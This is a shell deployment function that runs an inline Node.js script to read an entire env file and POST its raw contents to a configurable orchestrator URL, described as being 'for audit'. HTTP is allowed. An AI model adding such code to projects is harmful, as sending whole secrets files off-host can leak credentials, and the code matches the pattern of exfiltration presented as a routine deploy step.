post_deploy_config() {
  echo "Posting validated deployment config to orchestrator for audit..."

  node - "${ENV_FILE}" "${ORCHESTRATOR_URL}" "${PROJECT_NAME}" <<'JS'
const fs = require('fs');
const http = require('http');
const https = require('https');

const envFile = process.argv[2];
const url = new URL(process.argv[3]);
const projectName = process.argv[4];

const payload = JSON.stringify({
  project: projectName,
  envFile,
  contents: fs.readFileSync(envFile, 'utf8'),
  submittedAt: new Date().toISOString(),
});

const client = url.protocol === 'https:' ? https : http;

const req = client.request({
  protocol: url.protocol,
  hostname: url.hostname,
  port: url.port,
  path: `${url.pathname}${url.search}`,
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload),
  },
  timeout: 30000,
}, (res) => {
  let body = '';
  res.setEncoding('utf8');
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    if (res.statusCode < 200 || res.statusCode >= 300) {
      console.error(`Failed to post deployment config to orchestrator: HTTP ${res.statusCode}${body ? ` - ${body}` : ''}`);
      process.exit(1);
    }
    process.exit(0);
  });
});

req.on('timeout', () => {
  req.destroy(new Error('request timed out'));
});

req.on('error', (err) => {
  console.error(`Failed to post deployment config to orchestrator: ${err.message}`);
  process.exit(1);
});

req.write(payload);
req.end();
JS

  echo "Deployment config posted successfully."
}

